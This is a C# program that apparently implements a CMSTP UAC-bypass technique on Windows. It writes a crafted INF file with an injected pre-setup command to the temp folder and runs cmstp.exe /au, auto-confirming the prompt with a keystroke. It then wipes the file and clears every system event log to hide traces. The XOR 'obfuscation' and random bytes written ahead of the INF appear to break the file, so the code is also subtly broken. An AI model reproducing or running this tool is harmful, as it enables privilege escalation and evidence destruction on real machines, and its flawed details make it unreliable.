using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class Program
{
    // Obfuscate INF data using XOR
    public static string a(string A)
    {
        byte[] B = Encoding.UTF8.GetBytes(A);

        for (int i = 0; i < B.Length; i++)
        {
            B[i] = (byte)(B[i] ^ 0x55);
        }

        return Encoding.UTF8.GetString(B);
    }

    // Deobfuscate INF data using XOR
    public static string b(string A)
    {
        return a(A);
    }

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    public const string C = "c:\\windows\\system32\\cmstp.exe";

    public static void Main(string[] D)
    {
        string E = "runlegacyexplorer.exe";

        const string F = @"
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /F /IM cmstp.exe

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""
";

        string G = a(F);

        H(E, G);
    }

    public static void H(string I, string J)
    {
        if (!File.Exists(C)) return;

        IntPtr K = GetConsoleWindow();
        ShowWindow(K, 0);

        ProcessStartInfo L = new ProcessStartInfo("taskkill")
        {
            Arguments = "/F /IM cmstp.exe",
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process.Start(L);

        string M = N(I, J);

        Console.WriteLine("Obfuscated payload file written to " + M);

        ProcessStartInfo O = new ProcessStartInfo(C)
        {
            Arguments = "/au " + M,
            UseShellExecute = false
        };
        Process.Start(O);

        IntPtr P = IntPtr.Zero;
        do
        {
            P = Q("cmstp");
        } while (P == IntPtr.Zero);

        SendKeys.SendWait("{ENTER}");

        R(M);
    }

    public static IntPtr Q(string S)
    {
        Process[] T = Process.GetProcessesByName(S);
        if (T.Length == 0) return IntPtr.Zero;
        T[0].Refresh();
        IntPtr U = T[0].MainWindowHandle;
        if (U == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(U);
        ShowWindow(U, 5);
        return U;
    }

    public static string N(string I, string J)
    {
        string V = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string W = "C:\\windows\\temp";
        StringBuilder X = new StringBuilder();
        X.Append(W);
        X.Append("\\");
        X.Append(V);
        X.Append(".inf");

        int Y = 1024;
        byte[] Z = new byte[Y];
        new Random().NextBytes(Z);
        File.WriteAllBytes(X.ToString(), Z);

        File.AppendAllText(X.ToString(), J.Replace("REPLACE_COMMAND_LINE", I));

        return X.ToString();
    }

    public static void R(string filePath)
    {
        byte[] randomData = new byte[1024];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(randomData);
        }
        File.WriteAllBytes(filePath, randomData);
        File.Delete(filePath);

        ClearEventLogs();
    }

    public static void ClearEventLogs()
    {
        EventLog[] eventLogs = EventLog.GetEventLogs();
        foreach (EventLog eventLog in eventLogs)
        {
            eventLog.Clear();
        }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
